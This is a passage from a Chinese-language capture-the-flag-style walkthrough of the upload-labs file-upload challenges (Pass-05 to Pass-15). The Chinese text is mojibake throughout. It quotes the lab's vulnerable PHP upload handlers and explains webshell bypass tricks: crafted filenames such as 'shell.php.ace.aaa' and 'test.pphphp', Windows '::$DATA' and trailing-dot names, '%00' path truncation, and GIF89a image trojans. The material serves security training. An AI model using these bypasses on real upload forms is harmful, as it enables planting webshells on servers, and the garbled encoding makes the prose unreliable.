&#39;.&#39;);</code>ä¸­çš„<code>strrchr()</code>å‡½æ•°æ˜¯æœ‰ç‚¹é—®é¢˜çš„ã€‚è¿™ä¸ªå‡½æ•°çš„æ„æ€æ˜¯â€œå‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦â€ã€‚</p><p>åˆè€ƒè™‘åˆ°apacheçš„1.xç‰ˆæœ¬å’Œ2.xç‰ˆæœ¬æ˜¯å­˜åœ¨è§£ææ¼æ´çš„ï¼Œå³â€œå½“ç¢°åˆ°ä¸è®¤è¯†çš„æ‰©å±•åæ—¶ï¼Œå°†ä¼šä»åå‘å‰è§£æï¼Œç›´åˆ°ç¢°åˆ°è®¤è¯†çš„ æ‰©å±•åï¼Œå¦‚æœéƒ½ä¸è®¤è¯†ï¼Œåˆ™ä¼šæš´éœ²å…¶æºç ã€‚æ¯”å¦‚ 1.php.rar.ss.aa ä¼šè¢«å½“åšPHPè„šæœ¬æ‰§è¡Œâ€ã€‚</p><p>æ‰€ä»¥åœ¨æ­¤æˆ‘ä»¬åªéœ€è¦å°†æˆ‘ä»¬shell.phpçš„åç§°ä¿®æ”¹ä¸ºshell.php.ace.aaaï¼Œç„¶åä¸Šä¼ å³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8812.54.13.png" alt="image"></p><p>æ³¨: æ­¤å¤„çš„é»‘åå•æ˜¯æ²¡æœ‰å®Œå…¨è¿‡æ»¤çš„ï¼Œå¹¶ä¸”åœ¨æ­¤å¤„ä¹Ÿæ²¡æœ‰å°†ä¸Šä¼ æ–‡ä»¶åè½¬æ¢ä¸ºå°å†™ï¼Œæ¯”å¦‚å½¢å¦‚shell.phPå°±å¯ä»¥è¾¾åˆ°ä¸Šä¼ ç»•è¿‡çš„ç›®çš„</p><h3 id="0x06-Pass-06"><a href="#0x06-Pass-06" class="headerlink" title="0x06 Pass-06"></a>0x06 Pass-06</h3><p>ä»ä»£ç å¯ä»¥çœ‹åˆ°è¿‡æ»¤çš„å¯ä»¥è¯´å¾ˆä¸¥äº†ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¦è€ƒè™‘ä¸‹æ“ä½œç³»ç»Ÿçš„ç‰¹æ€§ï¼Œæ­¤å¤„å‰18é¢˜å‡ä½¿ç”¨Windowsæ“ä½œç³»ç»Ÿï¼Œè€ŒWindowsæ“ä½œç³»ç»Ÿå¯¹æ–‡ä»¶çš„å‘½åè§„åˆ™æ˜¯æœ‰ç‰¹ç‚¹çš„ï¼Œæ¯”å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   ã€€ã€€test.asp.</span><br><span class="line">   ã€€ã€€test.asp(ç©ºæ ¼)</span><br><span class="line">   ã€€ã€€test.php:1.jpg</span><br><span class="line">   ã€€ã€€test.php:: $DATA</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨æ­¤å¤„ä»£ç è¿‡æ»¤äº†â€™.â€™å’Œâ€™::$DATAâ€™æ‰€ä»¥æˆ‘ä»¬åªèƒ½ä½¿ç”¨ä¸­é—´é‚£ä¸¤ç§æ–¹å¼ã€‚<br>æ³¨: ä¼šè¢«windowsç³»ç»Ÿè‡ªåŠ¨å»æ‰ä¸ç¬¦åˆè§„åˆ™ç¬¦å·åé¢çš„å†…å®¹<br>åœ¨æ­¤å¤„ä½¿ç”¨burpæŠ“åŒ…ä¿®æ”¹ä¸Šä¼ å³å¯<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.14.55.png" alt="image"><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.15.09.png" alt="image"></p><h3 id="0x07-Pass-07"><a href="#0x07-Pass-07" class="headerlink" title="0x07 Pass-07"></a>0x07 Pass-07</h3><p>æ­¤é¢˜bypassä¸Šä¼ çš„åŸç†ä¸Pass-06ç›¸åŒï¼Œæ­¤å¤„æˆ‘ä»¬å°è¯•ä¸‹ä¸Šä¼ test.php .è¿™ç§æ ¼å¼çš„æ–‡ä»¶ï¼Œè¿™ç§æ ¼å¼çš„æ–‡ä»¶åœ¨ä¸Šä¼ åˆ°Windowsä¸Šä¹‹åæ–‡ä»¶ä¸­æœ€åä¸€ä¸ªç‚¹ä¼šè¢«å»æ‰ï¼Œæ‰€ä»¥ä½ è®¿é—®<code>test.php .</code>å’Œè®¿é—®<code>test.php</code>çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.36.04.png" alt="image"></p><h3 id="0x08-Pass-08"><a href="#0x08-Pass-08" class="headerlink" title="0x08 Pass-08"></a>0x08 Pass-08</h3><p>æ­¤é¢˜å‘ç°ç›¸è¾ƒäºPass-07è€Œè¨€å¯¹<code>::$DATA</code>æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥åŸç†å·²ç»åœ¨Pass-06è®²è¿‡äº†ï¼Œåœ¨æ­¤å¤„æˆ‘ä»¬ç›´æ¥ä¸Šä¼ <code>test.php:: $DATA</code><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.45.43.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.47.38.png" alt="image"></p><h3 id="0x09-Pass-09"><a href="#0x09-Pass-09" class="headerlink" title="0x09 Pass-09"></a>0x09 Pass-09</h3><p>æ­¤é¢˜ç›¸è¾ƒäºPass-07å°±å¤šäº†ä¸‹é¢è¿™ä¸€è¡Œä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä¸ä¸ŠåŸç†ç›¸åŒçš„æ–¹å¼ï¼Œæ„é€ <code>test.php. .</code>è¿›è¡Œä¸Šä¼ ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.56.55.png" alt="image"></p><h3 id="0x10-Pass-10"><a href="#0x10-Pass-10" class="headerlink" title="0x10 Pass-10"></a>0x10 Pass-10</h3><p>é¦–å…ˆåˆ†æä¸‹ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°é—®é¢˜å‡ºç°åœ¨ç¬¬8è¡Œçš„<code>str_ireplace()</code>å‡½æ•°ï¼Œæ­¤å‡½æ•°åœ¨æ­¤çš„ä½œç”¨æ˜¯å¯¹<code>$file_name</code>å˜é‡ä¸­å«æœ‰<code>$deny_ext</code>å†…å®¹çš„éƒ¨åˆ†æ›¿æ¢ä¸ºç©ºï¼Œä½†æ˜¯æ­¤æ“ä½œåªæ‰§è¡Œä¸€æ¬¡ã€‚â€œåªæ‰§è¡Œä¸€æ¬¡â€å°±æ˜¯é—®é¢˜æ‰€åœ¨ï¼Œå¦‚æœæˆ‘ä»¬ä¸Šä¼ ç±»ä¼¼<code>test.pphphp</code>è¿™æ ·çš„æ–‡ä»¶ï¼Œä¸Šä¼ åæ–‡ä»¶ä¼šè‡ªåŠ¨è¢«ä¿®æ”¹ä¸º<code>test.php</code>è¿›è€ŒæˆåŠŸä¸Šä¼ shellã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%882.12.33.png" alt="image"><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%882.14.07.png" alt="image"></p><h3 id="0x11-Pass-11"><a href="#0x11-Pass-11" class="headerlink" title="0x11 Pass-11"></a>0x11 Pass-11</h3><p>åˆ†æä»£ç å‘ç°æœ€ç»ˆè¿”å›çš„å›¾ç‰‡é“¾æ¥æ˜¯â€œå­˜å‚¨è·¯å¾„å+é‡å‘½ååçš„æ–‡ä»¶åâ€ï¼Œçœ‹åˆ°è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥è”æƒ³åˆ°ä½¿ç”¨%00æˆªæ–­è·¯å¾„ã€‚<br>æˆ‘ä»¬é¦–å…ˆä¿®æ”¹å‚æ•°ä¸º<code>index.php?save_path=../upload/test.php%00</code><br>ï¼›å…¶æ¬¡ä¿®æ”¹æˆ‘ä»¬çš„<code>test.php</code>ä¸º<code>test.jpg</code>ç„¶åä¸Šä¼ å³å¯ã€‚<br>æ³¨: æ­¤å¤„åº”å…·æœ‰æ–°å»ºæ–‡ä»¶å¤¹çš„æƒé™ï¼Œå¦‚æœæ²¡æœ‰ä¼šæŠ¥é”™å¹¶å¯¼è‡´ä¸Šä¼ å¤±è´¥<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    <span class="comment">//substr()æ˜¯è¿”å›ä»startå‚æ•°å¼€å§‹çš„å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</span></span><br><span class="line">    <span class="comment">//strrpos()æ˜¯æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®</span></span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'ä¸Šä¼ å¤±è´¥ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="0x12-Pass-12"><a href="#0x12-Pass-12" class="headerlink" title="0x12 Pass-12"></a>0x12 Pass-12</h3><p>æ­¤é¢˜diffäº†ä¸€ä¸‹ï¼Œå‘ç°ä»£ç ä¸Pass-11ä¸­çš„æ˜¯ä¸€æ‘¸ä¸€æ ·çš„ï¼Œæƒ³æ¢æ¢èŠ±æ ·çš„è¯åœ¨æ­¤å¤„æˆ‘ä»¬å¯ä»¥ä½¿ç”¨0x00æˆªæ–­ã€‚</p><p>%00å’Œ0x00æˆªæ–­çš„åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå³ç³»ç»Ÿåœ¨å¯¹æ–‡ä»¶åçš„è¯»å–æ—¶ï¼Œå¦‚æœé‡åˆ°0x00ï¼Œå°±ä¼šè®¤ä¸ºè¯»å–å·²ç»“æŸã€‚</p><h3 id="0x13-Pass-13"><a href="#0x13-Pass-13" class="headerlink" title="0x13 Pass-13"></a>0x13 Pass-13</h3><p>åˆ†æä¸‹ä»£ç ï¼Œå‘ç°æ­¤å¤„å°±æ˜¯å¯¹æ–‡ä»¶å¤´è¿›è¡Œäº†è§£æï¼Œæ­¤æ—¶åªéœ€è¦ä¸Šä¼ å›¾ç‰‡é©¬æˆ–è€…åœ¨test.phpæ–‡ä»¶çš„å¼€å¤´åŠ ä¸ŠGIF89aå³å¯ã€‚</p><p>å¤šæ‰¯ä¸€å¥ï¼Œå›¾ç‰‡é©¬çš„åˆ¶ä½œå°±æ˜¯å°†ä½ çš„ä¸€å¥è¯æœ¨é©¬è¿½åŠ åˆ°ä¸€å¼ å›¾ç‰‡ç±»å‹æ–‡ä»¶çš„åé¢ã€‚</p><p>æ­¤é¢˜çš„ç›®çš„æ˜¯ä¸Šä¼ ï¼Œå¹¶ä¸æ˜¯getshellï¼Œæ‰€ä»¥åˆ°æ­¤å°±ç»“æŸäº†ï¼Œè¦æƒ³getshellè¿˜å¾—é…åˆæ–‡ä»¶è§£ææ¼æ´ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å¤±è´¥"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8810.56.46.png" alt="image"></p><h3 id="0x14-Pass-14"><a href="#0x14-Pass-14" class="headerlink" title="0x14 Pass-14"></a>0x14 Pass-14</h3><p>åˆ†æä¸€ä¸‹ä»£ç ï¼Œè™½ç„¶å†™çš„ä¸ä¸€æ ·äº†ï¼Œä½†æ˜¯è·Ÿä¸Šä¸€é¢˜å·®ä¸å¤šã€‚æ‰€ä»¥åŒç†å¯å¾—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        <span class="comment">//getimagesize() å‡½æ•°ç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        <span class="comment">//image_type_to_extension()æ ¹æ®ç»™å®šçš„å¸¸é‡ IMAGETYPE_XXX è¿”å›åç¼€å</span></span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å¤±è´¥"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8811.14.44.png" alt="image"></p><h3 id="0x15-Pass-15"><a href="#0x15-Pass-15" class="headerlink" title="0x15 Pass-15"></a>0x15 Pass-15</h3><p>åˆ†æä¸€ä¸‹ä»£ç 